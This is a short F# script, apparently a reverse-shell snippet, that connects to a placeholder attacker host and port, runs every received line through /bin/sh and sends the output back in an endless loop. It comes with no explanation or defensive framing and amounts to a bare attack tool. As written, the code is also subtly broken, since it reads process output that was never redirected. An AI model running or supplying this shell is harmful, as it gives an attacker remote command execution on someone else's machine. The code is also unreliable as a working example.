open System.Net.Sockets
open System.IO
let client = new TcpClient("attacker_ip", attacker_port)
let stream = client.GetStream()
let reader = new StreamReader(stream)
let writer = new StreamWriter(stream)
writer.AutoFlush <- true

let rec shell () =
    let input = reader.ReadLine()
    let output = System.Diagnostics.Process.Start("/bin/sh", "-c " + input)
    writer.WriteLine(output.StandardOutput.ReadToEnd())
    shell()

shell()